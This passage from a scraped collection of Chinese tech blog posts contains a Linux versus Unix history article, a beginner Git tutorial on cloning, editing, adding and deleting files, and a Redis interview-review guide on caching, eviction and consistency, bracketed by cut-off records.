ctivists和Linux0activists-request的不同——第一个用于给列表中的所有人发送邮件，第二个仅用于订阅和取消订阅。当然，您也可以直接发送邮件至torvalds@kruuna.helsinki.fi。我会尽量在一两天内回答所有的问题。尽管‘nic.funet.fi’可能会保持合理的更新状态，但是它还有些问题（即，我无法因为个人得到文件，但可以通过几个人）。因此，如果邮件列表上的人想要补丁或二进制文件，他们将会更快得到。感谢我要感谢学院…说真的，如果没有其他人的帮助，这个系统将永远不会有曙光，甚至会变得更糟。BruceEvans帮助我找到了需要更改的位置，以便gcc能正确地处理浮点数，并提供许多有用的想法/建议（他的Minix-386用于构建系统）。此外，EarlChew的estdio包被用于标准的IO库。像这样更自由地分发包！AlainWBlack和RichardTobin为Minix制作了gcc，没有它我就无法编译这个东西。GNU完成了我在Linux下使用的大部分程序。AlfredLeung发送了美国键盘补丁。附：“感谢”wirzeniu@kruuna.helsinki.fi他的“建设性”批评和“诙谐”的评论。他是我第一个-测试者，他应该被授予勇气奖章。LinusTorvalds(torvalds@kruuna.helsinki.fi)1991年10月10日1赞2收藏2评论", "url_object_id": "d6ec0ef3593f6a22382ac914afc4a27a"},{"title": "Linux vs. Unix：有什么不同？", "url": "http://blog.jobbole.com/114089/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/1d34dd467641215c527e32ede94fe494.jpg"], "praise_nums": 1, "fav_nums": 3, "comments_nums": 0, "tags": "2,0,1,8,/,0,6,/,0,6, ,·", "content": "原文出处：PhilEstes译文出处：Linux中国/MjSeven深入了解这两个有许多共同的传统和相同的目标的操作系统之间的不同。如果你是位二、三十岁的软件开发人员，那么你已经成长在一个由Linux主导的世界。数十年来，它一直是数据中心的重要参与者，尽管很难找到明确的操作系统市场份额报告，但Linux的数据中心操作系统份额可能高达70%，而Windows及其变体几乎涵盖了所有剩余的百分比。使用任何主流公共云服务的开发人员都可以预期目标系统会运行Linux。近些年来，随着Android和基于Linux的嵌入式系统在智能手机、电视、汽车和其他设备中的应用，Linux已经随处可见。即便如此，大多数软件开发人员，甚至是那些在这场历史悠久的“Linux革命”中长大的软件开发人员，也都听过说Unix。它听起来与Linux相似，你可能已经听到人们互换使用这些术语。或者你也许听说过Linux被称为“类Unix”操作系统。那么，Unix是什么？漫画喜欢将它画成巫师一样留着“灰胡子”的形象，坐在发光的绿色屏幕后面，写着C代码和shell脚本，由老式的、滴灌的咖啡提供动力。但是，Unix的历史比上世纪70年代那些留着胡子的C程序员要丰富得多。虽然详细介绍Unix历史和“Unix与Linux”比较的文章比比皆是，但本文将提供高级背景和列出这些互补世界之间的主要区别。Unix的起源Unix的历史始于20世纪60年代后期的AT&amp;T贝尔实验室，有一小组程序员希望为PDP-7编写一个多任务、多用户操作系统。这个贝尔实验室研究机构的团队中最著名的两名成员是KenThompson和DennisRitchie。尽管Unix的许多概念都是其前身（Multics）的衍生物，但Unix团队早在70年代就决定用C语言重写这个小型操作系统，这是将Unix与其他操作系统区分开来的原因。当时，操作系统很少，更不要说可移植的操作系统。相反，由于它们的设计和底层语言的本质，操作系统与他们所编写的硬件平台紧密相关。而通过C语言重构Unix、Unix现在可以移植到许多硬件体系结构中。除了这种新的可移植性，之所以使得Unix迅速扩展到贝尔实验室以外的其他研究和学术机构甚至商业用途，是因为操作系统设计原则的几个关键点吸引了用户和程序员们。首先是KenThompson的Unix哲学成为模块化软件设计和计算的强大模型。Unix哲学推荐使用小型的、专用的程序组合起来完成复杂的整体任务。由于Unix是围绕文件和管道设计的，因此这种“管道”模式的输入和输出程序的组合成一组线性的输入操作，现在仍然流行。事实上，目前的云功能即服务（FaaS）或无服务器计算模型要归功于Unix哲学的许多传统。快速增长和竞争到70年代末和80年代，Unix成为了一个操作系统家族的起源，它遍及了研究和学术机构以及日益增长的商业Unix操作系统业务领域。Unix不是开源软件，Unix源代码可以通过与它的所有者AT&amp;T达成协议来获得许可。第一个已知的软件许可证于1975年出售给伊利诺伊大学UniversityofIllinois。Unix在学术界迅速发展，在KenThompson在上世纪70年代的学术假期间，伯克利成为一个重要的活动中心。通过在伯克利的各种有关Unix的活动，Unix软件的一种新的交付方式诞生了：伯克利软件发行版BerkeleySoftwareDistribution（BSD）。最初，BSD不是AT&amp;TUnix的替代品，而是一种添加类似于附加软件和功能。在1979年，2BSD（第二版伯克利软件发行版）出现时，伯克利研究生BillJoy已经添加了现在非常有名的程序，例如vi和Cshell（/bin/csh）。除了成为Unix家族中最受欢迎的分支之一的BSD之外，Unix的商业产品的爆发贯穿了二十世纪八、九十年代，其中包括HP-UX、IBM的AIX、Sun的Solaris、Sequent和Xenix等。随着分支从根源头发展壮大，“Unix战争”开始了，标准化成为社区的新焦点。POSIX标准诞生于1988年，其他标准化后续工作也开始通过TheOpenGroup在90年代到来。在此期间，AT&amp;T和Sun发布了SystemVRelease4（SVR4），许多商业供应商都采用了这一版本。另外，BSD系列操作系统多年来一直在增长，最终一些开源的变体在现在熟悉的BSD许可证下发布。这包括FreeBSD、OpenBSD和NetBSD，每个在Unix服务器行业的目标市场略有不同。这些Unix变体今天仍然有一些在使用，尽管人们已经看到它们的服务器市场份额缩小到个位数字（或更低）。在当今的所有Unix系统中，BSD可能拥有最大的安装基数。另外，每台AppleMac硬件设备从历史的角度看都可以算做是BSD，这是因为OSX（现在是macOS）操作系统是BSD衍生产品。虽然Unix的全部历史及其学术和商业变体可能需要更多的篇幅，但为了我们文章的重点，让我们来讨论Linux的兴起。进入Linux今天我们所说的Linux操作系统实际上是90年代初期的两个努力的结合。RichardStallman希望创建一个真正的自由而开放源代码的专有Unix系统的替代品。他正在以GNU的名义开发实用程序和程序，这是一种递归的说法，意思是“GNU‘snotUnix!”。虽然当时有一个内核项目正在进行，但事实证明这是一件很困难的事情，而且没有内核，自由和开源操作系统的梦想无法实现。而这是LinusTorvald的工作——生产出一种可工作和可行的内核，他称之为Linux—它将整个操作系统带入了生活。鉴于Linus使用了几个GNU工具（例如GNU编译器集合，即GCC），GNU工具和Linux内核的结合是完美的搭配。Linux发行版采用了GNU的组件、Linux内核、MIT的X-WindowsGUI以及可以在开源BSD许可下使用的其它BSD组件。像Slackware和RedHat这样的发行版早期的流行给了20世纪90年代的“普通PC用户”一个进入Linux操作系统的机会，并且让他们在工作和学术生活中可以使用许多Unix系统特有的功能和实用程序。由于所有Linux组件都是自由和开放的源代码，任何人都可以通过一些努力来创建一个Linux发行版，所以不久后发行版的总数达到了数百个。今天，distrowatch.com列出了312种各种形式的独特的Linux发行版。当然，许多开发人员通过云提供商或使用流行的免费发行版来使用Linux，如Fedora、Canonical的Ubuntu、Debian、ArchLinux、Gentoo和许多其它变体。随着包括IBM在内的许多企业从专有Unix迁移到Linux上并提供了中间件和软件解决方案，商用Linux产品在自由和开源组件之上提供支持变得可行。红帽公司围绕RedHatEnterpriseLinux（红帽企业版Linux）建立了商业支持模式，德国供应商SUSE使用SUSELinuxEnterpriseServer（SLES）也提供了这种模式。比较Unix和Linux到目前为止，我们已经了解了Unix的历史以及Linux的兴起，以及GNU/自由软件基金会对Unix的自由和开源替代品的支持。让我们来看看这两个操作系统之间的差异，它们有许多共同的传统和许多相同的目标。从用户体验角度来看，两者差不多！Linux的很大吸引力在于操作系统在许多硬件体系结构（包括现代PC）上的可用性以及类似使用Unix系统管理员和用户熟悉的工具的能力。由于POSIX的标准和合规性，在Unix上编写的软件可以针对Linux操作系统进行编译，通常只有少量的移植工作量。在很多情况下，Shell脚本可以在Linux上直接使用。虽然一些工具在Unix和Linux之间有着略微不同的标志或命令行选项，但许多工具在两者上都是相同的。一方面要注意的是，macOS硬件和操作系统作为主要针对Linux的开发平台的流行可能归因于类BSD的macOS操作系统。许多用于Linux系统的工具和脚本可以在macOS终端内轻松工作。Linux上的许多开源软件组件都可以通过Homebrew等工具轻松获得。Linux和Unix之间的其他差异主要与许可模式有关：开源与专有许可软件。另外，在Unix发行版中缺少一个影响软件和硬件供应商的通用内核。对于Linux，供应商可以为特定的硬件设备创建设备驱动程序，并期望在合理的范围内它可以在大多数发行版上运行。由于Unix家族的商业和学术分支，供应商可能必须为Unix的变体编写不同的驱动程序，并且需要许可和其他相关的权限才能访问SDK或软件的分发模型，以跨越多个二进制设备驱动程序的Unix变体。随着这两个社区在过去十年中的成熟，Linux的许多优点已经在Unix世界中被采用。当开发人员需要来自不属于Unix的GNU程序的功能时，许多GNU实用程序可作为Unix系统的附件提供。例如，IBM的AIX为Linux应用程序提供了一个AIXToolbox，其中包含数百个GNU软件包（如Bash、GCC、OpenLDAP和许多其他软件包），这些软件包可添加到AIX安装包中以简化Linux和基于Unix的AIX系统之间的过渡。专有的Unix仍然活着而且还不错，许多主要供应商承诺支持其当前版本，直到2020年。不言而喻，Unix还会在可预见的将来一直出现。此外，Unix的BSD分支是开源的，而NetBSD、OpenBSD和FreeBSD都有强大的用户基础和开源社区，它们可能不像Linux那样显眼或活跃，但在最近的服务器报告中，在Web服务等领域它们远高于专有Unix的数量。Linux已经显示出其超越Unix的显著优势在于其在大量硬件平台和设备上的可用性。树莓派RaspberryPi受到业余爱好者的欢迎，它是由Linux驱动的，为运行Linux的各种物联网设备打开了大门。我们已经提到了Android设备，汽车（包括AutomotiveGradeLinux）和智能电视，其中Linux占有巨大的市场份额。这个星球上的每个云提供商都提供运行Linux的虚拟服务器，而且当今许多最受欢迎的原生云架构都是基于Linux的，无论你是在谈论容器运行时还是Kubernetes，或者是许多正在流行的无服务器平台。其中一个最显著的代表Linux的优势是近年来微软的转变。如果你十年前告诉软件开发人员，Windows操作系统将在2016年“运行Linux”，他们中的大多数人会歇斯底里地大笑。但是WindowsLinux子系统（WSL）的存在和普及，以及最近宣布的诸如Docker的Windows移植版，包括LCOW（Windows上的Linux容器）支持等功能都证明了Linux在整个软件世界中所产生的影响——而且显然还会继续存在。1赞3收藏评论", "url_object_id": "93cf887d22a88cdab82dc81d187d23a1"},{"title": "在 Git 中怎样克隆、修改、添加和删除文件？", "url": "http://blog.jobbole.com/114104/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/a9f8e32251fe9ed8030a42ac78ef2343.jpg"], "praise_nums": 1, "fav_nums": 2, "comments_nums": 0, "tags": "2,0,1,8,/,0,6,/,0,9, ,·", "content": "原文出处：KedarVijayKulkarni译文出处：Linux中国/MjSeven在本系列的第一篇文章开始使用Git时，我们创建了一个简单的Git仓库，并用我们的计算机连接到它，向其中添加一个文件。在本文中，我们将学习一些关于Git的其他内容，即如何克隆（下载）、修改、添加和删除Git仓库中的文件。让我们来克隆一下假设你在GitHub上已经有一个Git仓库，并且想从它那里获取你的文件——也许你在你的计算机上丢失了本地副本，或者你正在另一台计算机上工作，但是想访问仓库中的文件，你该怎么办？从GitHub下载你的文件？没错！在Git术语中我们称之为“克隆clone”。（你也可以将仓库作为ZIP文件下载，但我们将在本文中探讨克隆方式。）让我们克隆在上一篇文章中创建的名为Demo的仓库。（如果你还没有创建Demo仓库，请跳回到那篇文章并在继续之前执行那些步骤）要克隆文件，只需打开浏览器并导航到https://github.com/&lt;your_username&gt;/Demo(其中&lt;your_username&gt;是你仓库的名称。例如，我的仓库是https://github.com/kedark3/Demo)。一旦你导航到该URL，点击“克隆或下载Cloneordownload”按钮，你的浏览器看起来应该是这样的：正如你在上面看到的，“使用HTTPS克隆ClonewithHTTPS”选项已打开。从该下拉框中复制你的仓库地址（https://github.com/&lt;your_username&gt;/Demo.git），打开终端并输入以下命令将GitHub仓库克隆到你的计算机：gitclonehttps://github.com/&lt;your_username&gt;/Demo.git12gitclonehttps://github.com/&lt;your_username&gt;/Demo.git然后，要查看Demo目录中的文件列表，请输入以下命令：lsDemo/12lsDemo/终端看起来应该是这样的：修改文件现在我们已经克隆了仓库，让我们修改文件并在GitHub上更新它们。首先，逐个输入下面的命令，将目录更改为Demo/，检查README.md中的内容，添加新的（附加的）内容到README.md，然后使用gitstatus检查状态:cdDemo/lscatREADME.mdecho\"AddedanotherlinetoREAMD.md\"&gt;&gt;README.mdcatREADME.mdgitstatus1234567cdDemo/lscatREADME.mdecho\"AddedanotherlinetoREAMD.md\"&gt;&gt;README.mdcatREADME.mdgitstatus如果你逐一运行这些命令，终端看起开将会是这样：让我们看一下gitstatus的输出，并了解它的意思。不要担心这样的语句：OnbranchmasterYourbranchisup-to-datewith'origin/master'.\".123OnbranchmasterYourbranchisup-to-datewith'origin/master'.\".因为我们还没有学习这些。（LCTT译注：学了你就知道了）下一行说：Changesnotstagedforcommit（变化未筹划提交）；这是告诉你，它下面列出的文件没有被标记准备（“筹划stage”）提交。如果你运行gitadd，Git会把这些文件标记为Readyforcommit（准备提交）；换句话说就是Changesstagedforcommit（变化筹划提交）。在我们这样做之前，让我们用gitdiff命令来检查我们添加了什么到Git中，然后运行gitadd。这里是终端输出：我们来分析一下：diff--gita/README.mdb/README.md是Git比较的内容（在这个例子中是README.md）。---a/README.md会显示从文件中删除的任何东西。+++b/README.md会显示从文件中添加的任何东西。任何添加到文件中的内容都以绿色文本打印，并在该行的开头加上+号。如果我们删除了任何内容，它将以红色文本打印，并在该行的开头加上-号。现在gitstatus显示Changestobecommitted:（变化将被提交），并列出文件名（即README.md）以及该文件发生了什么（即它已经被modified并准备提交）。提示：如果你已经运行了gitadd，现在你想看看文件有什么不同，通常gitdiff不会输出任何东西，因为你已经添加了文件。相反，你必须使用gitdiff--cached。它会告诉你Git添加的当前版本和以前版本文件之间的差别。你的终端输出看起来会是这样：上传文件到你的仓库我们用一些新内容修改了README.md文件，现在是时候将它上传到GitHub。让我们提交更改并将其推送到GitHub。运行：gitcommit-m\"UpdatedReadmefile\"12gitcommit-m\"UpdatedReadmefile\"这告诉Git你正在“提交”已经“添加”的更改，你可能还记得，从本系列的第一部分中，添加一条消息来解释你在提交中所做的操作是非常重要的，以便你在稍后回顾Git日志时了解当时的目的。（我们将在下一篇文章中更多地关注这个话题。）UpdatedReadmefile是这个提交的消息——如果你认为这没有合理解释你所做的事情，那么请根据需要写下你的提交消息。运行gitpush-uoriginmaster，这会提示你输入用户名和密码，然后将文件上传到你的GitHub仓库。刷新你的GitHub页面，你应该会看到刚刚对README.md所做的更改。终端的右下角显示我提交了更改，检查了Git状态，并将更改推送到了GitHub。gitstatus显示：Yourbranchisaheadof'origin/master'by1commit(use\"gitpush\"topublishyourlocalcommits)123Yourbranchisaheadof'origin/master'by1commit(use\"gitpush\"topublishyourlocalcommits)第一行表示在本地仓库中有一个提交，但不在origin/master中（即在GitHub上）。下一行指示我们将这些更改推送到origin/master中，这就是我们所做的。（在本例中，请参阅本系列的第一篇文章，以唤醒你对origin含义的记忆。我将在下一篇文章中讨论分支的时候，解释master的含义。）添加新文件到Git现在我们修改了一个文件并在GitHub上更新了它，让我们创建一个新文件，将它添加到Git，然后将其上传到GitHub。运行：echo\"Thisisanewfile\"&gt;&gt;file.txt12echo\"Thisisanewfile\"&gt;&gt;file.txt这将会创建一个名为file.txt的新文件。如果使用cat查看它：catfile.txt12catfile.txt你将看到文件的内容。现在继续运行：gitstatus12gitstatusGit报告说你的仓库中有一个未跟踪的文件（名为file.txt）。这是Git告诉你说在你的计算机中的仓库目录下有一个新文件，然而你并没有告诉Git，Git也没有跟踪你所做的任何修改。我们需要告诉Git跟踪这个文件，以便我们可以提交并上传文件到我们的仓库。以下是执行该操作的命令：gitaddfile.txtgitstatus123gitaddfile.txtgitstatus终端输出如下：gitstatus告诉你有file.txt被修改，对于Git来说它是一个newfile，Git在此之前并不知道。现在我们已经为Git添加了file.txt，我们可以提交更改并将其推送到origin/master。Git现在已经将这个新文件上传到GitHub；如果刷新GitHub页面，则应该在GitHub上的仓库中看到新文件file.txt。通过这些步骤，你可以创建尽可能多的文件，将它们添加到Git中，然后提交并将它们推送到GitHub。从Git中删除文件如果我们发现我们犯了一个错误，并且需要从我们的仓库中删除file.txt，该怎么办？一种方法是使用以下命令从本地副本中删除文件：rmfile.txt12rmfile.txt如果你现在做gitstatus，Git就会说有一个文件notstagedforcommit（未筹划提交），并且它已经从仓库的本地拷贝中删除了。如果我们现在运行：gitaddfile.txtgitstatus123gitaddfile.txtgitstatus我知道我们正在删除这个文件，但是我们仍然运行gitadd，因为我们需要告诉Git我们正在做的更改，gitadd可以用于我们添加新文件、修改一个已存在文件的内容、或者从仓库中删除文件时。实际上，gitadd将所有更改考虑在内，并将这些筹划提交这些更改。如果有疑问，请仔细查看下面终端屏幕截图中每个命令的输出。Git会告诉我们已删除的文件正在进行提交。只要你提交此更改并将其推送到GitHub，该文件也将从GitHub的仓库中删除。运行以下命令：gitcommit-m\"Deletefile.txt\"gitpush-uoriginmaster123gitcommit-m\"Deletefile.txt\"gitpush-uoriginmaster现在你的终端看起来像这样：你的GitHub看起来像这样：现在你知道如何从你的仓库克隆、添加、修改和删除Git文件。本系列的下一篇文章将检查Git分支。1赞2收藏评论", "url_object_id": "2fd3e1a536854e3343b73dcb02097713"},{"title": "分布式之 Redis 复习精讲", "url": "http://blog.jobbole.com/114050/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "praise_nums": 1, "fav_nums": 9, "comments_nums": 1, "tags": "2,0,1,8,/,0,5,/,2,8, ,·", "content": "原文出处：孤独烟引言为什么写这篇文章?博主的《分布式之消息队列复习精讲》得到了大家的好评，内心诚惶诚恐，想着再出一篇关于复习精讲的文章。但是还是要说明一下，复习精讲的文章偏面试准备，真正在开发过程中，还是脚踏实地，一步一个脚印，不要投机取巧。考虑到绝大部分写业务的程序员，在实际开发中使用redis的时候，只会setvalue和getvalue两个操作，对redis整体缺乏一个认知。又恰逢博主某个同事下周要去培训redis，所以博主斗胆以redis为题材，对redis常见问题做一个总结，希望能够弥补大家的知识盲点。复习要点?本文围绕以下几点进行阐述1、为什么使用redis2、使用redis有什么缺点3、单线程的redis为什么这么快4、redis的数据类型，以及每种数据类型的使用场景5、redis的过期策略以及内存淘汰机制6、redis和数据库双写一致性问题7、如何应对缓存穿透和缓存雪崩问题8、如何解决redis的并发竞争问题正文1、为什么使用redis分析:博主觉得在项目中使用redis，主要是从两个角度去考虑:性能和并发。当然，redis还具备可以做分布式锁等其他功能，但是如果只是为了分布式锁这些其他功能，完全还有其他中间件(如zookpeer等)代替，并不是非要使用redis。因此，这个问题主要从性能和并发两个角度去答。回答:如下所示，分为两点（一）性能如下图所示，我们在碰到需要执行耗时特别久，且结果不频繁变动的SQL，就特别适合将运行结果放入缓存。这样，后面的请求就去缓存中读取，使得请求能够迅速响应。题外话：忽然想聊一下这个迅速响应的标准。其实根据交互效果的不同，这个响应时间没有固定标准。不过曾经有人这么告诉我:”在理想状态下，我们的页面跳转需要在瞬间解决，对于页内操作则需要在刹那间解决。另外，超过一弹指的耗时操作要有进度提示，并且可以随时中止或取消，这样才能给用户最好的体验。”那么瞬间、刹那、一弹指具体是多少时间呢？根据《摩诃僧祗律》记载一刹那者为一念，二十念为一瞬，二十瞬为一弹指，二十弹指为一罗预，二十罗预为一须臾，一日一夜有三十须臾。1一刹那者为一念，二十念为一瞬，二十瞬为一弹指，二十弹指为一罗预，二十罗预为一须臾，一日一夜有三十须臾。那么，经过周密的计算，一瞬间为0.36秒,一刹那有0.018秒.一弹指长达7.2秒。（二）并发如下图所示，在大并发的情况下，所有的请求直接访问数据库，数据库会出现连接异常。这个时候，就需要使用redis做一个缓冲操作，让请求先访问到redis，而不是直接访问数据库。2、使用redis有什么缺点分析:大家用redis这么久，这个问题是必须要了解的，基本上使用redis都会碰到一些问题，常见的也就几个。回答:主要是四个问题(一)缓存和数据库双写一致性问题(二)缓存雪崩问题(三)缓存击穿问题(四)缓存的并发竞争问题这四个问题，我个人是觉得在项目中，比较常遇见的，具体解决方案，后文给出。3、单线程的redis为什么这么快分析:这个问题其实是对redis内部机制的一个考察。其实根据博主的面试经验，很多人其实都不知道redis是单线程工作模型。所以，这个问题还是应该要复习一下的。回答:主要是以下三点(一)纯内存操作(二)单线程操作，避免了频繁的上下文切换(三)采用了非阻塞I/O多路复用机制题外话：我们现在要仔细的说一说I/O多路复用机制，因为这个说法实在是太通俗了，通俗到一般人都不懂是什么意思。博主打一个比方：小曲在S城开了一家快递店，负责同城快送服务。小曲因为资金限制，雇佣了一批快递员，然后小曲发现资金不够了，只够买一辆车送快递。经营方式一客户每送来一份快递，小曲就让一个快递员盯着，然后快递员开车去送快递。慢慢的小曲就发现了这种经营方式存在下述问题几十个快递员基本上时间都花在了抢车上了，大部分快递员都处在闲置状态，谁抢到了车，谁就能去送快递随着快递的增多，快递员也越来越多，小曲发现快递店里越来越挤，没办法雇佣新的快递员了快递员之间的协调很花时间综合上述缺点，小曲痛定思痛，提出了下面的经营方式经营方式二小曲只雇佣一个快递员。然后呢，客户送来的快递，小曲按送达地点标注好，然后依次放在一个地方。最后，那个快递员依次的去取快递，一次拿一个，然后开着车去送快递，送好了就回来拿下一个快递。对比上述两种经营方式对比，是不是明显觉得第二种，效率更高，更好呢。在上述比喻中:每个快递员——————&gt;每个线程每个快递——————–&gt;每个socket(I/O流)快递的送达地点————–&gt;socket的不同状态客户送快递请求————–&gt;来自客户端的请求小曲的经营方式————–&gt;服务端运行的代码一辆车———————-&gt;CPU的核数于是我们有如下结论1、经营方式一就是传统的并发模型，每个I/O流(快递)都有一个新的线程(快递员)管理。2、经营方式二就是I/O多路复用。只有单个线程(一个快递员)，通过跟踪每个I/O流的状态(每个快递的送达地点)，来管理多个I/O流。下面类比到真实的redis线程模型，如图所示参照上图，简单来说，就是。我们的redis-client在操作的时候，会产生具有不同事件类型的socket。在服务端，有一段I/0多路复用程序，将其置入队列之中。然后，文件事件分派器，依次去队列中取，转发到不同的事件处理器中。需要说明的是，这个I/O多路复用机制，redis还提供了select、epoll、evport、kqueue等多路复用函数库，大家可以自行去了解。4、redis的数据类型，以及每种数据类型的使用场景分析：是不是觉得这个问题很基础，其实我也这么觉得。然而根据面试经验发现，至少百分八十的人答不上这个问题。建议，在项目中用到后，再类比记忆，体会更深，不要硬记。基本上，一个合格的程序员，五种类型都会用到。回答：一共五种(一)String这个其实没啥好说的，最常规的set/get操作，value可以是String也可以是数字。一般做一些复杂的计数功能的缓存。(二)hash这里value存放的是结构化的对象，比较方便的就是操作其中的某个字段。博主在做单点登录的时候，就是用这种数据结构存储用户信息，以cookieId作为key，设置30分钟为缓存过期时间，能很好的模拟出类似session的效果。(三)list使用List的数据结构，可以做简单的消息队列的功能。另外还有一个就是，可以利用lrange命令，做基于redis的分页功能，性能极佳，用户体验好。(四)set因为set堆放的是一堆不重复值的集合。所以可以做全局去重的功能。为什么不用JVM自带的Set进行去重？因为我们的系统一般都是集群部署，使用JVM自带的Set，比较麻烦，难道为了一个做一个全局去重，再起一个公共服务，太麻烦了。另外，就是利用交集、并集、差集等操作，可以计算共同喜好，全部的喜好，自己独有的喜好等功能。(五)sortedsetsortedset多了一个权重参数score,集合中的元素能够按score进行排列。可以做排行榜应用，取TOPN操作。另外，参照另一篇《分布式之延时任务方案解析》，该文指出了sortedset可以用来做延时任务。最后一个应用就是可以做范围查找。5、redis的过期策略以及内存淘汰机制分析:这个问题其实相当重要，到底redis有没用到家，这个问题就可以看出来。比如你redis只能存5G数据，可是你写了10G，那会删5G的数据。怎么删的，这个问题思考过么？还有，你的数据已经设置了过期时间，但是时间到了，内存占用率还是比较高，有思考过原因么?回答:redis采用的是定期删除+惰性删除策略。为什么不用定时删除策略?定时删除,用一个定时器来负责监视key,过期则自动删除。虽然内存及时释放，但是十分消耗CPU资源。在大并发请求下，CPU要将时间应用在处理请求，而不是删除key,因此没有采用这一策略.定期删除+惰性删除是如何工作的呢?定期删除，redis默认每个100ms检查，是否有过期的key,有过期key则删除。需要说明的是，redis不是每个100ms将所有的key检查一次，而是随机抽取进行检查(如果每隔100ms,全部key进行检查，redis岂不是卡死)。因此，如果只采用定期删除策略，会导致很多key到时间没有删除。于是，惰性删除派上用场。也就是说在你获取某个key的时候，redis会检查一下，这个key如果设置了过期时间那么是否过期了？如果过期了此时就会删除。采用定期删除+惰性删除就没其他问题了么?不是的，如果定期删除没删除key。然后你也没即时去请求key，也就是说惰性删除也没生效。这样，redis的内存会越来越高。那么就应该采用内存淘汰机制。在redis.conf中有一行配置#maxmemory-policyvolatile-lru1#maxmemory-policyvolatile-lru该配置就是配内存淘汰策略的(什么，你没配过？好好反省一下自己)1）noeviction：当内存不足以容纳新写入数据时，新写入操作会报错。应该没人用吧。2）allkeys-lru：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的key。推荐使用，目前项目在用这种。3）allkeys-random：当内存不足以容纳新写入数据时，在键空间中，随机移除某个key。应该也没人用吧，你不删最少使用Key,去随机删。4）volatile-lru：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，移除最近最少使用的key。这种情况一般是把redis既当缓存，又做持久化存储的时候才用。不推荐5）volatile-random：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，随机移除某个key。依然不推荐6）volatile-ttl：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，有更早过期时间的key优先移除。不推荐ps：如果没有设置expire的key,不满足先决条件(prerequisites);那么volatile-lru,volatile-random和volatile-ttl策略的行为,和noeviction(不删除)基本上一致。6、redis和数据库双写一致性问题分析:一致性问题是分布式常见问题，还可以再分为最终一致性和强一致性。数据库和缓存双写，就必然会存在不一致的问题。答这个问题，先明白一个前提。就是如果对数据有强一致性要求，不能放缓存。我们所做的一切，只能保证最终一致性。另外，我们所做的方案其实从根本上来说，只能说降低不一致发生的概率，无法完全避免。因此，有强一致性要求的数据，不能放缓存。回答:《分布式之数据库和缓存双写一致性方案解析》给出了详细的分析，在这里简单的说一说。首先，采取正确更新策略，先更新数据库，再删缓存。其次，因为可能存在删除缓存失败的问题，提供一个补偿措施即可，例如利用消息队列。7、如何应对缓存穿透和缓存雪崩问题分析:这两个问题，说句实在话，一般中小型传统软件企业，很难碰到这个问题。如果有大并发的项目，流量有几百万左右。这两个问题一定要深刻考虑。回答:如下所示缓存穿透，即黑客故意去请求缓存中不存在的数据，导致所有的请求都怼到数据库上，从而数据库连接异常。解决方案:(一)利用互斥锁，缓存失效的时候，先去获得锁，得到锁了，再去请求数据库。没得到锁，则休眠一段时间重试(二)采用异步更新策略，无论key是否取到值，都直接返回。value值中维护一个缓存失效时间，缓存如果过期，异步起一个线程去读数据库，更新缓存。需要做缓存预热(项目启动前，先加载缓存)操作。(三)提供一个能迅速判断请求是否有效的拦截机制，比如，利用布隆过滤器，内部维护一系列合法有效的key。迅速判断出，请求所携带的Key是否合法有效。如果不合法，则直接返回。缓存雪崩，即缓存同一时间大面积的失效，这个时候又来了一波请求，结果请求都怼到数据库上，从而导致数据库连接异常。解决方案:(一)给缓存的失效时间，加上一个随机值，避免集体失效。(二)使用互斥锁，但是该方案吞吐量明显下降了。(三)双缓存。我们有两个缓存，缓存A和缓存B。缓存A的失效时间为20分钟，缓存B不设失效时间。自己做缓存预热操作。然后细分以下几个小点I从缓存A读数据库，有则直接返回IIA没有数据，直接从B读数据，直接返回，并且异步启动一个更新线程。III更新线程同时更新缓存A和缓存B。8、如何解决redis的并发竞争key问题分析:这个问题大致就是，同时有多个子系统去set一个key。这个时候要注意什么呢？大家思考过么。需要说明一下，博主提前百度了一下，发现答案基本都是推荐用redis事务机制。博主不推荐使用redis的事务机制。因为我们的生产环境，基本都是redis集群环境，做了数据分片操作。你一个事务中有涉及到多个key操作的时候，这多个key不一定都存储在同一个redis-server上。因此，redis的事务机制，十分鸡肋。回答:如下所示(1)如果对这个key操作，不要求顺序这种情况下，准备一个分布式锁，大家去抢锁，抢到锁就做set操作即可，比较简单。(2)如果对这个key操作，要求顺序假设有一个key1,系统A需要将key1设置为valueA,系统B需要将key1设置为valueB,系统C需要将key1设置为valueC.期望按照key1的value值按照valueA–&gt;valueB–&gt;valueC的顺序变化。这种时候我们在数据写入数据库的时候，需要保存一个时间戳。假设时间戳如下系统Akey1{valueA3:00}系统Bkey1{valueB3:05}系统Ckey1{valueC3:10}123系统Akey1{valueA3:00}系统Bkey1{valueB3:05}系统Ckey1{valueC3:10}那么，假设这会系统B先抢到锁，将key1设置为{valueB3:05}。接下来系统A抢到锁，发现自己的valueA的时间戳早于缓存中的时间戳，那就不做set操作了。以此类推。其他方法，比如利用队列，将set方法变成串行访问也可以。总之，灵活变通。总结本文对redis的常见问题做了一个总结。大部分是博主自己在工作中遇到，以及以前面试别人的时候，爱问的一些问题。另外，不推荐大家临时抱佛脚，真正碰到一些有经验的工程师，其实几下就能把你问懵。最后，希望大家有所收获吧。1赞9收藏1评论", "url_object_id": "ab6b90e6a2bac7d584de17cc2fd8106c"},{"title": "2017 年，我发布了 6 个副项目", "url": "http://blog.jobbole.com/113822/", "create_date": "2018-09-13", "front_image_url": ["http://wx1.sinaimg.cn/large/63918611gy1frenpxw9krj20rs0j6q9i.jpg"], "praise_nums": 1, "fav_nums": 3, "comments_nums": 0, "tags": "2,0,1,8,/,0,6,/,0,8, ,·", "content": 